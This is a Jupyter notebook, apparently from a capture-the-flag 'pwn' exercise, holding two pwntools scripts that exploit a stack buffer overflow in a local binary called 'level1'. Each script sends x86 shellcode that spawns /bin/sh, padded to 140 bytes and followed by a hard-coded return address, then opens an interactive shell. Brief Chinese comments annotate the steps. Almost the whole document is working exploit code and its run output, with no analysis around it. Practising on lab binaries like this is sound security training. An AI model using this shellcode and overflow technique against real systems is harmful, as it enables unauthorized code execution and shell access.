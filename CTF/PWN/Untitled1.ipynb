{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "env: TERMINFO=/usr/share/terminfo\n",
      "env: PWNLIB_NOTERM=true\n",
      "[x] Starting local process './level1'\n",
      "[+] Starting local process './level1': pid 1301\n",
      "[*] Switching to interactive mode\n"
     ]
    }
   ],
   "source": [
    "%env TERMINFO=/usr/share/terminfo\n",
    "%env PWNLIB_NOTERM=true\n",
    "from pwn import *\n",
    "\n",
    "p = process('./level1') \n",
    "#p = remote('127.0.0.1',10001)\n",
    "\n",
    "#ret = 0xbffff290\n",
    "#ret = 0xffffd4e0 #local address\n",
    "ret = 0xffffd430\n",
    "\n",
    "shellcode = b\"\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\"\n",
    "shellcode += b\"\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\"\n",
    "shellcode += b\"\\x0b\\xcd\\x80\"\n",
    "\n",
    "# p32(ret) == struct.pack(\"<I\",ret) \n",
    "#对ret进行编码，将地址转换成内存中的二进制存储形式\n",
    "payload = shellcode + b'A' * (140 - len(shellcode)) + p32(ret)\n",
    "\n",
    "p.send(payload) #发送payload\n",
    "p.interactive()  #开启交互shell"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# %load level1.py\n",
    "#!/usr/bin/env python\n",
    "from pwn import *\n",
    "\n",
    "p = process('./level1') \n",
    "#p = remote('127.0.0.1',10001)\n",
    "\n",
    "#ret = 0xbffff290\n",
    "ret = 0xffffd4e0 #local address\n",
    "#ret = 0xffffd430 #sonat address\n",
    "\n",
    "shellcode = b\"\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\"\n",
    "shellcode += b\"\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\"\n",
    "shellcode += b\"\\x0b\\xcd\\x80\"\n",
    "\n",
    "# p32(ret) == struct.pack(\"<I\",ret) \n",
    "#对ret进行编码，将地址转换成内存中的二进制存储形式\n",
    "payload = shellcode + b'A' * (140 - len(shellcode)) + p32(ret)\n",
    "\n",
    "p.send(payload) #发送payload\n",
    "\n",
    "p.interactive()  #开启交互shell\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 2",
   "language": "python",
   "name": "python2"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.15+"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
